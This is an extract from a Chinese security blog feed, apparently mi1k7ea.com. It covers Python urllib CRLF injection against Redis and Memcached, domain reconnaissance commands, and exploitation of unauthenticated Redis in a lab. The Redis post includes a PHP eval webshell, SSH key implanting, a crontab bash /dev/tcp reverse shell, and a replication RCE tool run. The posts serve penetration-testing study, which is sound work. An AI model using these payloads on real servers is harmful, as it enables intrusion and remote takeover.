class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>根据HRS，攻击者可以追加注入一个完整的HTTP请求头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo</span><br></pre></td></tr></table></figure><p>此时请求包内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">POST /bar HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">&#123;&quot;new&quot;:&quot;json&quot;,&quot;content&quot;:&quot;here&quot;&#125;</span><br><span class="line">:12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>该请求在Apache HTTPD下是能成功利用的，但在其他的Web容器中就不一定能正确地解析利用了，这是需要前端服务和后端服务解析的二义性才能导致HRS攻击成功。</p><p>这种攻击可以用在内网攻击上，比如无认证的Rest接口等。</p><h3 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h3><p>如果Redis在本地未设置密码验证即存在未授权访问漏洞，那么攻击者可以组合Python urllib CRLF注入漏洞来攻击利用Redis未授权访问漏洞，通过其备份文件的功能实现写WebShell、SSH公钥和定时任务反弹shell等等。</p><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h3 id="Memcached未授权访问漏洞"><a href="#Memcached未授权访问漏洞" class="headerlink" title="Memcached未授权访问漏洞"></a>Memcached未授权访问漏洞</h3><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，即使没有对外开放端口，但攻击者还是可以组合Python urllib CRLF注入漏洞来通过命令交互来直接读入Memcached中的敏感信息。</p><p>如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span><br></pre></td></tr></table></figure><p>就会产生下面的HTTP头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">set foo 0 0 5</span><br><span class="line">ABCDE</span><br><span class="line">:11211</span><br></pre></td></tr></table></figure><p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">STORED</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br></pre></td></tr></table></figure><p>经过确认，memcached中确实成功的插入了<code>foo</code>的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><p><a href="http://pages.strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
      <category term="CRLF注入" scheme="https://www.mi1k7ea.com/tags/CRLF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之域相关信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/03/08/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%9F%9F%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/03/08/内网信息收集之域相关信息收集/</id>
    <published>2020-03-08T09:23:51.000Z</published>
    <updated>2020-03-08T14:14:43.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-判断是否存在域"><a href="#0x01-判断是否存在域" class="headerlink" title="0x01 判断是否存在域"></a>0x01 判断是否存在域</h2><p>获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。</p><h3 id="ipconfig命令"><a href="#ipconfig命令" class="headerlink" title="ipconfig命令"></a>ipconfig命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令即可查看网管IP、DNS IP、域名、本机是否和DNS服务器出于同一网段等信息。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/1.png" alt=""></p><p>然后就可以通过反向解析命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断DC和DNS服务是否在同一台服务器上。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/2.png" alt=""></p><h3 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>显示项的“域”即域名，“登录服务器”即域控制器。若“域”为“WORKGROUP”则表示当前机器不在域内。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/3.png" alt=""></p><h3 id="查询当前登录域及登录用户信息"><a href="#查询当前登录域及登录用户信息" class="headerlink" title="查询当前登录域及登录用户信息"></a>查询当前登录域及登录用户信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中），“登录域”用于表示当前登录的用户是域用户还是本地用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/4.png" alt=""></p><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>该命令用于判断主域（域服务器通常会同时作为时间服务器使用），执行后通常会有如下三种情况：</p><p>1、存在域，但当前用户不是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/6.png" alt=""></p><p>2、存在域，且当前用户是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/5.png" alt=""></p><p>3、当前网络环境为工作组，不存在域。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/7.png" alt=""></p><h2 id="0x02-探测域内存活主机"><a href="#0x02-探测域内存活主机" class="headerlink" title="0x02 探测域内存活主机"></a>0x02 探测域内存活主机</h2><h3 id="利用NetBIOS探测内网"><a href="#利用NetBIOS探测内网" class="headerlink" title="利用NetBIOS探测内网"></a>利用NetBIOS探测内网</h3>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Redis安全小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/05/Redis%E5%AE%89%E5%85%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/05/Redis安全小结/</id>
    <published>2020-03-05T14:29:30.000Z</published>
    <updated>2020-03-10T14:48:19.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><p>Redis服务的默认端口是6379。</p><p>官网查看更多信息：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p><ul><li>查看信息：info</li><li>删除所有数据库内容：flushall</li><li>刷新数据库：flushdb</li><li>查看所有键：keys *，使用select num可以查看键值数据</li><li>设置变量：set aaa “mi1k7ea”</li><li>查看变量值：get aaa</li><li>查看备份文件路径：config get dir</li><li>设置备份文件路径：config set dir dirpath</li><li>查看备份文件名：config get dbfilename</li><li>设置备份文件名：config set dbfilename filename</li><li>保存备份文件：save</li></ul><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>这里搭建漏洞版本的Redis服务，同时配置服务进行全网监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并解压运行make</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line">tar zxf redis-3.2.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.11/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入src目录中将redis-server和redis-cli复制到/usr/bin目录下，方便命令识别</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将redis.conf复制到/etc/目录下</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑/etc/中的redis配置文件redis.conf</span></span><br><span class="line">vim /etc/redis.conf</span><br><span class="line"><span class="comment">#注释掉本地绑定，允许除本地外的主机远程访问Redis服务</span></span><br><span class="line"><span class="comment">##bind 127.0.0.1</span></span><br><span class="line"><span class="comment">#关闭保护模式，允许远程连接Redis服务</span></span><br><span class="line"><span class="comment">#protected-mode no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用/etc/目录下的redis.conf文件中的配置来启动Redis服务</span></span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.137 -p 6379</span><br></pre></td></tr></table></figure><h3 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" title="安全配置密码验证"></a>安全配置密码验证</h3><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p><p>我们可以通过以下命令查看是否设置了密码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure><p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p><p>你可以通过以下命令来修改该参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;runoob&quot;</span><br></pre></td></tr></table></figure><p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p><p>密码验证用到AUTH命令，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure><h2 id="0x02-Redis漏洞攻击利用"><a href="#0x02-Redis漏洞攻击利用" class="headerlink" title="0x02 Redis漏洞攻击利用"></a>0x02 Redis漏洞攻击利用</h2><p>Redis漏洞包括未授权访问漏洞所引起的一系列深入攻击利用以及其他一些已知的Redis CVE漏洞。</p><p>在旧版本中Redis默认配置的服务是监听在公网的，而在最近这些新版本中都默认将监听地址改为本地监听，即前面redis.conf中看到的<code>bind 127.0.0.1</code>。</p><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p><p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p><h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p><p><img src="/2020/03/05/Redis安全小结/1.png" alt=""></p><p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p><p><img src="/2020/03/05/Redis安全小结/2.png" alt=""></p><p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用：</p><p><img src="/2020/03/05/Redis安全小结/3.png" alt=""></p><h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p><p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p><p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[c]);?&gt;&quot;</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/4.png" alt=""></p><p>在服务端看到生成的shell.php内容如下，可以看到PHP代码穿插其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007�redis-ver3.2.11�</span><br><span class="line">redis-bits�@�ctime� c^used-mem�h�</span><br><span class="line">                                  ��payload&lt;?php @eval($_POST[c]);?&gt;�hUuϞ^</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/5.png" alt=""></p><p>由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p><p><img src="/2020/03/05/Redis安全小结/6.png" alt=""></p><h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p><p>原理和前面一样的，只是备份的目录和文件名修改为/root/.ssh/目录和authorized_keys文件名。</p><p>先在Ubuntu中生成公私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/7.png" alt=""></p><p>获取公钥内容<code>cat /home/ski12/.ssh/id_rsa.pub</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/8.png" alt=""></p><p>通过Redis客户端将公钥内容写入到/root/.ssh/authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/9.png" alt=""></p><p>为了不用自己复制粘贴公钥内容，换种形式也OK：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; m7.txt</span><br><span class="line">cat m7.txt | redis-cli -h 192.168.10.137 -p 6379 <span class="built_in">set</span> payload</span><br></pre></td></tr></table></figure><p>此时看到Kali中的/root/.ssh/目录中成功生成了authorized_keys文件的：</p><p><img src="/2020/03/05/Redis安全小结/10.png" alt=""></p><p>注意，如果Kali中的SSH服务还没开启的话，通过如下命令开启即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure><p>接着在Ubuntu上使用私钥直接SSH远程连接到Kali，得到shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.137</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/11.png" alt=""></p><h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：</p><ul><li>权限问题，Ubuntu定时任务需要root权限；</li><li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li></ul><p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.307/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/13.png" alt=""></p><p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p><p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p><p><img src="/2020/03/05/Redis安全小结/12.png" alt=""></p><p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/14.png" alt=""></p><p>具体CentOS的利用可自行测试。</p><p>不同OS的系统任务调度文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure><blockquote><p>可进行利用的cron有如下几个地方：</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li></ul></blockquote><h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p><p>写入/etc/passwd文件实现任意账号密码重置：<a href="https://www.freebuf.com/vuls/148758.html#-etcpasswd" target="_blank" rel="noopener">https://www.freebuf.com/vuls/148758.html#-etcpasswd</a></p><p>写入Windows启动项：<a href="https://www.anquanke.com/post/id/170360#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-3</a></p><p>写入Windows MOF：<a href="https://www.anquanke.com/post/id/170360#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-4</a></p><h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p><p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p><p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p><p>Redis主从数据库之间的同步分为两种：</p><ul><li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li><li>部分复制只是将写命令发送给从机；</li></ul><p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p><p>这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure><p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p><p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p><p>然后在攻击者机器上执行如下命令即可成功RCE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/15.png" alt=""></p><h3 id="用Hydra暴力破解Redis密码"><a href="#用Hydra暴力破解Redis密码" class="headerlink" 